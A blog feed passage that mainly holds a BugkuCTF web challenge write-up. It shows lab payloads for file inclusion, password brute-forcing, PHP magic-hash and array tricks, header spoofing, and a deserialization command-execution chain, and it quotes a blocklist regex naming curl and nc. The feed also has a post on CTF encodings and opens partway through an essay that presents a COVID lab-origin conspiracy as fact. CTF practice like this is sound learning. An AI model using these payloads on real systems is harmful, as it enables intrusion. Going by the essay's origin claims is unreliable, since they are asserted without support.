神明就是地球，但是地球的头部却被切开一片，露出了大脑内部组织。在这片裸露的区域上，有8个针管在往大脑中注射某种液体，这八个针管形成了一个王冠的形状。地球巨人的左手被四个巨大的金属环所固定，动弹不得。再看看，是什么钉住了这个巨人，这四个金属环上绘制的形象很明显，分别是：代表着金融霸权的美元，代表着军事霸权的F22战机，代表着科技霸权的芯片，代表着舆论霸权的推特！</p><p>​    改造又是何以？两个无头人，以及左侧福尔马林罐子中浸泡的头部的深意更是如此，两个无头人分别穿戴着纳粹德国和日本法西斯的军装，两个人分别对应的是日本731部队的石井四郎，与纳粹德国的戈培尔。 两个无头的怪胎，这正是美国在疫情期间的所作所为，积极攻击抹黑中国，消极抗疫。而右侧的无头人，向巨人正在用巨大的针头将研究的细菌病毒注射进地球巨人的身体之中。这也是至今为止的未解之谜，德赫里特堡病毒实验室，在战后继承了日本731部队的遗产究竟做了什么？</p><p>​    视线从画面内移出时间2021年7月31日，这个时间正是美国政府造谣指责武汉病毒实验室，推卸抗疫不力的时间。戈培尔的名言是：“谣言重复一千遍就成为了真理”。对于新冠溯源问题，美国正式在使用着德国纳粹的伎俩，一遍遍重复着那可笑的谣言，这也是这个作品所抨击的内容。</p><p>​    乌合麒麟，本名：付昱，代表作：《为弄臣加冕》、《至莫里森》、《伪神》、《剑来》、《敬呼吸》、《“和平之师”》。就像在与世界说中他所说的，他只是一个兴趣使然的画手，乌合麒麟认为传递和输出意识形态其实恰恰是艺术作品和艺术家的责任之一。所以他这么做了，而且是抱着抛砖引玉的态度，希望有更多的文艺工作者能善用自身技能去为祖国和人民做一些事情。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/10/28/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F.png" alt="1635418358508"></p><p>​    乌合麒麟在知乎上对自己有过如下评价，有的人在意舞台，有的人在意表演，所以你如果把我的作品简单理解成“绘画”那确实一般，画画好的人多了去了，上不封顶，我就是个在山脚下玩的开开心心的小学生，也从来没想过攀登绘画这座山峰最终走入殿堂。但是你要说你能从我画面中感受到一些共性的东西，它能够带给你一些最直接的触动，我觉得我已经做到了我想要做的，我所通过镜头、画面传递的这些东西，以及我对于创作形式的理念和所做出的探索在艺术的历史上能找到对标的人应该不多，所以它应该称不上是什么艺术形式，但是未来它会不会成为一种泛艺术形式的趋势？不得而知，拭目以待。</p><p>​    有人说艺术家不应该牵扯政治，我并不见得。用康德美学的观点来看，艺术与政治的联姻是肮脏的，画笔怎么能被指挥刀指挥呢？某种程度上来说，我们也不喜欢看那种为了专门为了逢迎宣传而制作的文化产品。</p><p>​    乌合麒麟的一副作品《和平之师》让我想到了，早在多年前看到的毕加索的《格尔尼卡》。《格尔尼卡》的意义也已经远远超越了艺术史层面，它同时也是世界上最著名的反战巨作。西班牙当代艺术家路易斯·戈迪略说，“毕加索画了一幅历史画，这幅画又变成了历史和传说”。《格尔尼卡》带给我的是一种震破耳膜的静默，而《和平之师》则是最凝重的悲哀。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/10/28/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F/2.jpg" alt="img"></p><center>《格尔尼卡》</center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/10/28/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F/%E5%92%8C%E5%B9%B3%E4%B9%8B%E5%B8%88.JPG" style="zoom: 17%;" /><center>《和平之师》</center><p>在评论中我看到这样一个评论，澳大利亚当局与纳粹有什么不同？答案是，纳粹重来没有要求毕加索为《格尔尼卡》道歉。</p><p>瑞典著名电影艺术家英格玛博格曼曾经说过：人们就如此被围在一个大圈里，彼此倾诉痛哭，但是没有任何一个人真的倾听别人在说什么。</p><p>如果说，在这样一个信息发达，又彼此意见分裂的社会中，艺术有什么用处，那么就是给予我们那些我们本应当知道却并不知道的感性认识。这就是艺术在当代的意义，我们需要一种语言，去链接隔阂的两端，以便重新审视我们内心，这不只是对某个议题的再认识，也是对作为观众的我们自己的再认识。</p><p>艺术家不应该躲避政治，艺术家应该主动参与政治，因为艺术是难以被曲解，被断章取义的。唯有艺术能使更多人唤起深刻的共鸣。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中那些有趣的编码与解码方式</title>
      <link href="/2021/10/19/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F/"/>
      <url>/2021/10/19/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>还是推荐大家去看《CTF中那些脑洞大开的编码和加密》这篇文章</p><h3 id="神奇的编码形式："><a href="#神奇的编码形式：" class="headerlink" title="神奇的编码形式："></a>神奇的编码形式：</h3><p><del>兽语密码极类似编码</del>：<a href="http://hi.pcmoe.net/roar.html">兽语编码</a>这个编码是之前做NuCTF迎新赛的时候看到的，类似的编码还有<a href="https://ctf.bugku.com/tool/todousharp">与佛论禅</a>密码，<a href="http://hi.pcmoe.net/index.html">与熊论道</a>，<a href="http://hi.pcmoe.net/buddha.html">新佛曰</a>，<a href="https://ctf.bugku.com/tool/cvecode">社会主义价值观密码</a>等。以下部分是以**flag{}**进行加密得到。</p><blockquote><p>兽音译者: <del>呜嗷嗷嗷嗷呜啊嗷啊呜呜嗷呜呜</del>嗷嗷<del>啊嗷啊呜嗷嗷</del>嗷<del>嗷</del>呜呜嗷呜啊嗷嗷嗷呜啊呜<del>啊呜嗷呜呜</del>呜呜嗷啊 </p></blockquote><blockquote><p>与佛论禅:   佛曰：麼那究夷穆波皤特那俱婆怯耶即姪哆室那亦有</p></blockquote><blockquote><p>与熊论道:   熊曰：呋食食啽笨咯人和嘶啽更</p></blockquote><blockquote><p>新佛曰：    新佛曰：諸毘隸僧降吽毘諸陀摩隸毘僧毘缽薩願毘耨咤毘陀願毘羅毘嘇喃毘塞毘薩毘如毘囑</p></blockquote><blockquote><p>社会主义价值观密码:  公正公正公正友善公正公正民主公正法治法治友善平等法治友善法治</p></blockquote><h3 id="各种文本加密："><a href="#各种文本加密：" class="headerlink" title="各种文本加密："></a>各种文本加密：</h3><p> 文本加密可以将正常文本内容打乱为不可连读的文字或符号(汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)，换行等格式信息也会被清除，达到加密的作用。在进行文本加密时可以设定一个密码，这样只有知道密码的人才能解密文本。密码可以是数字、字母和下划线，最多九位。 </p><p>如<strong>音符符号加密</strong></p><blockquote><p>♬♩¶♯♬♭♬♫♫♪♫♫♯=</p></blockquote><p>对于这一种加密方式，还是推荐一个平台，<a href="https://www.qqxiuzi.cn/daohang.htm">千千秀字</a>能解决不少文本加密的。</p><p><img src="D:\blog\shierjinghuang\source_posts\CTF中那些有趣的编码与解码方式\1.png"></p><h3 id="奇怪的编程语言"><a href="#奇怪的编程语言" class="headerlink" title="奇怪的编程语言:"></a><strong>奇怪的编程语言:</strong></h3><p> <strong>Brainfuck</strong> ，<strong>OKK</strong>这些实际上都是一些奇怪的编程语言，有时候这些编程语言也会作为密码进行加密。对于这些编程语言，考察的一般是快速学习能力和资源检索能力。<a href="https://news.mydrivers.com/1/190/190926.htm">这个</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF知识介绍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自我介绍</title>
      <link href="/2021/10/19/%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/"/>
      <url>/2021/10/19/%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p> 坐标：山东省日照市 </p><p>QFNU 现役CTF选手，数学建模菜鸟，创业大赛专业陪跑，网络工程专业在读。</p><p>才疏学浅，人菜手残</p><blockquote><p>简书： <a href="https://www.jianshu.com/u/462e5700d9f0">https://www.jianshu.com/u/462e5700d9f0</a></p><p>Gitee: <a href="https://im-so-scared-2.gitee.io/shier_jinghuang/">https://im-so-scared-2.gitee.io/shier_jinghuang/</a></p><p>Github :<a href="https://shierjinghuang.github.io/">https://shierjinghuang.github.io/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF之web解题记录(一)</title>
      <link href="/2021/10/17/BugkuCTF%E4%B9%8Bweb%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%B8%80/"/>
      <url>/2021/10/17/BugkuCTF%E4%B9%8Bweb%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="BugkuCTF之web解题记录-一"><a href="#BugkuCTF之web解题记录-一" class="headerlink" title="BugkuCTF之web解题记录(一)"></a>BugkuCTF之web解题记录(一)</h1><p>[TOC]</p><h3 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1 文件包含"></a>1 文件包含</h3><p>题目明示了这个题的漏洞类型，文件包含漏洞。</p><p>构造payload：**?file=php://filter/read=convert.base64-encode/resource=index.php** </p><p>文件包含类型的漏洞关于php://filter这一为协议有两张构造方式另一种是**?file=php://filter/resource=xxx.php**这一种类型往往无法显示，所以一般采用第一种方式。</p><blockquote><p>77u/PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LXdlYjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFnezk5YmZmMzJjZTkwYTZmY2I0YWVhYTFmMTAzNjM2MzY3fQ0KPz4NCjwvaHRtbD4NCg== </p></blockquote><p>得到一大堆base64编码，解码得到flag</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;html&gt;    &lt;title&gt;Bugku-web&lt;&#x2F;title&gt;&lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;echo &quot;Oh no!&quot;;exit();&#125;include($file); &#x2F;&#x2F;flag:flag&#123;99bff32ce90a6fcb4aeaa1f103636367&#125;?&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-好像需要密码"><a href="#2-好像需要密码" class="headerlink" title="2 好像需要密码"></a>2 好像需要密码</h3><p> <img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\76f459dbcc7649b1a388c385b1c7f31d.jpg" alt="1"></p><p>随便往里面传一个数据，使用<code>burp</code>抓包， 抓包后发送到<code>Intruder</code>模块 ，由于密码是五位数，还有字典生成工具生成一个从00000到99999的字典导入burp的<code>Intruder</code>模块， 将<code>pwd</code>置为参数，因为变化的只有一个参数<code>pwd</code>，所以选择的攻击方式为<code>Sniper</code> 。</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?yes HTTP&#x2F;1.1Host: 114.67.246.176:12057User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko&#x2F;20100101 Firefox&#x2F;92.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 7Origin: http:&#x2F;&#x2F;114.67.246.176:12057Connection: closeReferer: http:&#x2F;&#x2F;114.67.246.176:12057&#x2F;Cookie: Hm_lvt_c1b044f909411ac4213045f0478e96fc&#x3D;1620903791,1621819076; _ga&#x3D;GA1.1.1921386327.1620903793Upgrade-Insecure-Requests: 1pwd&#x3D;§111§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在进行攻击就可以了，会跑一会，大概四五分钟就可以了。 当<code>Payload</code>为<code>12468</code>的时候返回包的长度是不同的，这个数字很可能就是密码 输入12468，题目返回了flag</p><p><del><strong>flag{003feb2a87a93d430302de9745225ccf}</strong></del></p><h3 id="3-md5"><a href="#3-md5" class="headerlink" title="3 md5"></a>3 md5</h3><p>这个题的话应该是出题人的问题，md5碰撞没给源码……让我想到了当年那道社工题目，社工题目游戏附件里的文件被删了，出题人还不去修复…..</p><p>好在评论区有高手啊，在评论区找到了题目的源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$md51</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$md52</span> <span class="token operator">=</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$md51</span> <span class="token operator">==</span> <span class="token variable">$md52</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nctf&#123;*****************&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"false!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"please input a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 将<code>QNKCDZO</code>进行<code>md5</code>加密后，发现为0e开头，所以此又有题目的提示，考虑MD5碰撞，就是经过md5加密后以0e开头的在进行‘==’运算时，php会认为他们都为0。 </p><p>随便用md5文件解码工具，解码一个0e开头的md5构造<code>payload</code> ：<code>php?a=s1885207154a </code>就能得到flag</p><p><del><strong>flag{1f8ca27b98fec312c275523757fcb967}</strong></del></p><h3 id="4-安慰奖"><a href="#4-安慰奖" class="headerlink" title="4 安慰奖"></a>4 安慰奖</h3><p>打开网页是空白的，查看源码有显示<code>YmFja3Vwcw==</code>是一个base64加密，得到<code>backups</code>备份意思是这个网站应该有备份的php文件泄露，使用御剑扫描后台。有个名叫<code>index.php.bnk</code>的备份，下载下来</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;!-- YmFja3Vwcw== -->"</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctf</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hack'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'NULL'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|tail|less|head|curl|nc|strings|sort|echo/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;/br>flag能让你这么容易拿到吗？&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>           <span class="token comment">// echo "&lt;br>right!&lt;br>";</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string backtick-quoted-string">`$this->cmd`</span><span class="token punctuation">;</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>给你个安慰奖吧，hhh！&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。</li><li>与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用  __wakeup方法，预先准备对象需要的资源。</li><li>__construct()：PHP 允许开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</li><li>__destruct()：PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li></ol><p>需要注意的是当访问控制符为private与protect时，序列化时比较特殊：　　</p><ul><li>protected属性被序列化的时候属性值会变成：%00*%00属性名</li><li>private属性被序列化的时候属性值会变成：%00类名%00属性名</li></ul><p>分析代码</p><p>需要我们上传一个code参数，程序会对其反序列化，当判断username为admin时，会执行cmd内的代码。</p><p>因为调用unserialize函数之前会调用__wakeup方法，后面会将username覆盖为guest。将变量个数修改为大于实际值的数就能够绕过。</p><p>构造：O:3:”ctf”:3:{s:11:”%00*%00username”;s:5:”admin”;s:6:”%00*%00cmd”;s:2:”ls”;}</p><p> 使用tac指令读取：O:3:”ctf”:3:{s:11:”%00*%00username”;s:5:”admin”;s:6:”%00*%00cmd”;s:12:”tac flag.php”;} </p><p><strong><del>flag{Unser1alize_and_2CE_Add}</del></strong></p><h3 id="5-程序员本地登录"><a href="#5-程序员本地登录" class="headerlink" title="5 程序员本地登录"></a>5 程序员本地登录</h3><p>这个题我好想做了好几次了,,,我想了一下，这个其实不用burp，在浏览器拦截重发就行，而且他说了本地登录</p><blockquote><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段 </p></blockquote><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\2.png" alt="2"></p><p>加上<code>X-Forwarded-For: 127.0.0.1</code>就行了。</p><p>得到<del><strong>flag{931ce924403e96daa678573e8f53a1fa}</strong></del></p><h3 id="6-需要管理员"><a href="#6-需要管理员" class="headerlink" title="6 需要管理员"></a>6 需要管理员</h3><p>打开网页他给我报<code>404 Not Found</code>，使用御剑扫描后台，找到robots.txt打开就行。</p><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\3.png" alt="3"></p><p><code>Disallow: /resusl.php</code>接着打开就行，然后他回显<strong>Warning:你不是管理员你的IP已经被记录到日志了</strong></p><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\4.png" alt="4"></p><p>在下面有回显,<strong>if ($_GET[x]==$password) <strong>，猜一手password为<code>admin</code>,构造</strong>?x=admin</strong>就的得到了flag</p><p><del><strong>flag{b57e4e59986a3799ed691bd01312686d}</strong></del></p><h3 id="7-变量1"><a href="#7-变量1" class="headerlink" title="7 变量1"></a>7 变量1</h3><p>打开网址发现一段PHP代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag1.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump(<span class="token interpolation"><span class="token variable">$$args</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**if(isset($_GET[‘args’]))<strong>要求我们通过get方法传参，同时</strong>if(!preg_match(“/^\w+$/“,$args))**这一句代码我们可以知道他把<del>大小写字母和数字</del>,的全部过滤了。$$args说明了这个应该是个数组，传一个超全局变量GLOBALS就能得到flag</p><blockquote><p>构造的pload ：<a href="http://114.67.246.176:11080/?args=GLOBALS">http://114.67.246.176:11080/?args=GLOBALS</a></p></blockquote><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\5.png" alt="1634979258452"></p><p>关于PHP的超全局变量找了<a href="https://blog.csdn.net/weixin_33918357/article/details/91536217">一篇博客</a></p><h3 id="8-前女友"><a href="#8-前女友" class="headerlink" title="8 前女友"></a>8 前女友</h3><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\6.png" alt="6"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">!=</span> <span class="token variable">$v2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到md5，和==符号就想到了PHP的弱类型。</p><pre class="line-numbers language-none"><code class="language-none">构造: index.php?v1[]&#x3D;QLTHNDT&amp;v2[]&#x3D;UTIPEZQ&amp;v3[]&#x3D;EEIZDOI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 